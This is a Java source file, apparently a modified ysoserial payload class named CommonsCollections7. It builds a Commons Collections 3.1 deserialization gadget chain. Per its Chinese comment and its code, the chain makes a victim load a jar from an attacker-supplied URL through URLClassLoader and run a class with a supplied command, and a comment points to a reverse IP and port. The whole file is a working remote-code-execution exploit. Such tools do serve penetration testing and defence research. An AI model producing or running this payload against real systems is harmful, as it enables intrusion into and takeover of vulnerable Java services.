package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */

/**
 * 修改自CommonsCollections5，实现从外部url加载jar，并执行。
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.MATTHIASKAISER, Authors.JASINNER, Authors.JAYL1n})
public class CommonsCollections7 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {

    public BadAttributeValueExpException getObject(final String args) throws Exception {
        int indexOfFirstSpace = args.indexOf(" ");
        String url = "";
        String command = "";
        if (indexOfFirstSpace != -1) {
            url = args.substring(0, indexOfFirstSpace);
            command = args.substring(indexOfFirstSpace);
        }

        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(java.net.URLClassLoader.class),
            // getConstructor class.class classname
            new InvokerTransformer("getConstructor",
                                   new Class[]{Class[].class},
                                   new Object[]{new Class[]{java.net.URL[].class}}),
            new InvokerTransformer(
                "newInstance",
                new Class[]{Object[].class},
                new Object[]{new Object[]{new java.net.URL[]{new java.net.URL(url)}}}),
            // loadClass String.class R
            new InvokerTransformer("loadClass",
                                   new Class[]{String.class}, new Object[]{"R"}),
            // set the target reverse ip and port
            new InvokerTransformer("getConstructor",
                                   new Class[]{Class[].class},
                                   new Object[]{new Class[]{String.class}}),
            // invoke
            new InvokerTransformer("newInstance",
                                   new Class[]{Object[].class},
                                   new Object[]{new String[]{command}}),
            new ConstantTransformer(1)};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections7.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

}
